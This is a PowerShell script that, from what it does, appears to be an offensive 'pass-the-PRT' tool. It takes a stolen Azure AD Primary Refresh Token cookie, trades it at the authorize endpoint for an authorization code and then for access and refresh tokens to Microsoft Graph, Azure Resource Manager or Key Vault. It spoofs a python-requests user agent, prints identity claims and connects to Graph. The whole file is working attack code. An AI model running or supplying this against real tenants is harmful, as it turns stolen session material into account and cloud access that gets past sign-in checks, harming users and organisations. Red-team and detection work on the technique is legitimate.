param(
    [Parameter(Mandatory=$true)][string]$PrtCookie,
    [Parameter(Mandatory=$true)][string]$TenantId,
    [string]$Resource = "msgraph"
)

# Resource aliases -> full URLs
$resourceMap = @{
    "msgraph"  = "https://graph.microsoft.com/"
    "aadgraph" = "https://graph.windows.net/"
    "azurerm"  = "https://management.azure.com/"
    "keyvault" = "https://vault.azure.net/"
}

if ($resourceMap.ContainsKey($Resource)) {
    $Resource = $resourceMap[$Resource]
}

# Client ID — Azure Active Directory PowerShell (public client, no secret needed)
$clientId    = "1b730954-1685-4b74-9bfd-dac224a7b894"
$redirectUri = "urn:ietf:wg:oauth:2.0:oob"

# --- JWT decoder ---
function Decode-JwtPayload {
    param([string]$Token)
    try {
        $parts   = $Token.Split(".")
        $payload = $parts[1]
        $pad     = 4 - ($payload.Length % 4)
        if ($pad -ne 4) { $payload += "=" * $pad }
        $payload = $payload.Replace("-", "+").Replace("_", "/")
        $decoded = [System.Text.Encoding]::UTF8.GetString(
            [System.Convert]::FromBase64String($payload))
        return $decoded | ConvertFrom-Json
    }
    catch { return $null }
}

# --- Step 1: GET authorize endpoint with PRT cookie ---
# AAD reads x-ms-RefreshTokenCredential cookie and issues auth code
# Same flow as roadtx: set cookie on authorize request, follow redirect

function Get-AuthCode {
    param(
        [string]$Cookie,
        [string]$Tenant,
        [string]$ResourceUrl,
        [string]$ClientId,
        [string]$RedirectUri
    )

    $authorizeUrl = "https://login.microsoftonline.com/$Tenant/oauth2/authorize" +
        "?client_id=$ClientId" +
        "&response_type=code" +
        "&redirect_uri=$([Uri]::EscapeDataString($RedirectUri))" +
        "&resource=$([Uri]::EscapeDataString($ResourceUrl))" +
        "&prompt=none"

    Write-Host "[*] Hitting authorize endpoint..." -ForegroundColor Cyan

    # Use WebRequest to control redirect behavior and cookie header
    try {
        $req = [System.Net.HttpWebRequest]::Create($authorizeUrl)
        $req.Method = "GET"
        $req.AllowAutoRedirect = $false
        $req.UserAgent = "python-requests/2.28.0"
        $req.Headers.Add("Cookie", "x-ms-RefreshTokenCredential=$Cookie")

        $resp = $req.GetResponse()
        $location = $resp.Headers["Location"]
        $resp.Close()

        if (-not $location) {
            throw "No redirect location returned - cookie may be expired"
        }

        Write-Host "[*] Redirect location: $location" -ForegroundColor DarkGray

        # Extract code from redirect URI
        # urn:ietf:wg:oauth:2.0:oob?code=<code>
        if ($location -match "[?&]code=([^&]+)") {
            return $matches[1]
        }

        # Check for error in redirect
        if ($location -match "[?&]error=([^&]+)") {
            $err = $matches[1]
            $desc = ""
            if ($location -match "[?&]error_description=([^&]+)") {
                $desc = [Uri]::UnescapeDataString($matches[1])
            }
            throw "AAD error in redirect: $err - $desc"
        }

        throw "No code found in redirect: $location"
    }
    catch [System.Net.WebException] {
        # AAD returns 302 as an exception in .NET
        $location = $_.Response.Headers["Location"]
        if ($location) {
            Write-Host "[*] Redirect location: $location" -ForegroundColor DarkGray

            if ($location -match "[?&]code=([^&]+)") {
                return $matches[1]
            }

            if ($location -match "[?&]error=([^&]+)") {
                $err = $matches[1]
                $desc = ""
                if ($location -match "[?&]error_description=([^&]+)") {
                    $desc = [Uri]::UnescapeDataString($matches[1])
                }
                throw "AAD error: $err - $desc"
            }
        }
        throw "Authorize request failed: $($_.Exception.Message)"
    }
}

# --- Step 2: Exchange auth code for tokens ---

function Get-TokenFromCode {
    param(
        [string]$Code,
        [string]$Tenant,
        [string]$ResourceUrl,
        [string]$ClientId,
        [string]$RedirectUri
    )

    $endpoint = "https://login.microsoftonline.com/$Tenant/oauth2/token"

    $body = @{
        "grant_type"   = "authorization_code"
        "code"         = $Code
        "client_id"    = $ClientId
        "redirect_uri" = $RedirectUri
        "resource"     = $ResourceUrl
    }

    $headers = @{
        "Content-Type" = "application/x-www-form-urlencoded"
        "User-Agent"   = "python-requests/2.28.0"
    }

    try {
        $response = Invoke-RestMethod `
            -Uri $endpoint `
            -Method POST `
            -Headers $headers `
            -Body $body `
            -ErrorAction Stop

        return $response
    }
    catch {
        $errBody = $_.ErrorDetails.Message
        if ($errBody) {
            try {
                $parsed = $errBody | ConvertFrom-Json
                throw "AAD error: $($parsed.error) - $($parsed.error_description)"
            }
            catch {
                throw "Token exchange failed: $($errBody)"
            }
        }
        throw "Token exchange failed: $($_.Exception.Message)"
    }
}

# --- Main ---

Write-Host "[*] Resource : $Resource" -ForegroundColor Cyan
Write-Host "[*] Tenant   : $TenantId" -ForegroundColor Cyan
Write-Host ""

# Step 1 - get auth code via PRT cookie
try {
    $authCode = Get-AuthCode `
        -Cookie $PrtCookie `
        -Tenant $TenantId `
        -ResourceUrl $Resource `
        -ClientId $clientId `
        -RedirectUri $redirectUri
}
catch {
    Write-Host "[-] Failed to get auth code - $_" -ForegroundColor Red
    Write-Host "[-] Cookie may be expired. Get a fresh PRT cookie and retry." -ForegroundColor Red
    exit 1
}

Write-Host "[+] Auth code obtained" -ForegroundColor Green
Write-Host "[*] Code     : $($authCode.Substring(0, [Math]::Min(40, $authCode.Length)))..." -ForegroundColor DarkGray
Write-Host ""

# Step 2 - exchange code for tokens
Write-Host "[*] Exchanging code for tokens..." -ForegroundColor Cyan

try {
    $tokenResponse = Get-TokenFromCode `
        -Code $authCode `
        -Tenant $TenantId `
        -ResourceUrl $Resource `
        -ClientId $clientId `
        -RedirectUri $redirectUri
}
catch {
    Write-Host "[-] Token exchange failed - $_" -ForegroundColor Red
    exit 1
}

if (-not $tokenResponse.access_token) {
    Write-Host "[-] No access token in response." -ForegroundColor Red
    exit 1
}

# Store globally
$global:accessToken  = $tokenResponse.access_token
$global:refreshToken = $tokenResponse.refresh_token
$global:expiresOn    = (Get-Date).AddSeconds($tokenResponse.expires_in)

# Print token info
Write-Host "[+] Access token obtained" -ForegroundColor Green
Write-Host "[*] Token type : $($tokenResponse.token_type)" -ForegroundColor DarkGray
Write-Host "[*] Expires in : $($tokenResponse.expires_in)s ($global:expiresOn)" -ForegroundColor DarkGray
Write-Host "[*] Resource   : $($tokenResponse.resource)" -ForegroundColor DarkGray
Write-Host ""

# Decode JWT claims
$claims = Decode-JwtPayload -Token $global:accessToken
if ($claims) {
    Write-Host "[*] UPN       : $($claims.upn)" -ForegroundColor DarkGray
    Write-Host "[*] AMR       : $($claims.amr -join ', ')" -ForegroundColor DarkGray
    Write-Host "[*] Device ID : $($claims.deviceid)" -ForegroundColor DarkGray
    Write-Host "[*] Tenant ID : $($claims.tid)" -ForegroundColor DarkGray
    Write-Host ""
}

Write-Host "[+] Token saved to `$global:accessToken" -ForegroundColor Green
Write-Host "[+] Refresh token saved to `$global:refreshToken" -ForegroundColor Green
Write-Host ""

# --- Connect to MS Graph ---

if ($Resource -like "*graph.microsoft.com*") {
    try {
        Connect-MgGraph `
            -AccessToken ($global:accessToken | ConvertTo-SecureString -AsPlainText -Force) `
            | Out-Null
        Write-Host "[+] Connected to Microsoft Graph" -ForegroundColor Green
        Write-Host ""
        Get-MgContext | Select-Object Account, TenantId, AppName, AuthType | Format-List
    }
    catch {
        Write-Host "[-] Failed to connect to Microsoft Graph: $_" -ForegroundColor Red
        Write-Host "[*] Access token still available in `$global:accessToken" -ForegroundColor DarkGray
    }
}
else {
    Write-Host "[*] Non-Graph resource - skipping Connect-MgGraph" -ForegroundColor DarkGray
    Write-Host "[*] Use `$global:accessToken directly with your target API" -ForegroundColor DarkGray
}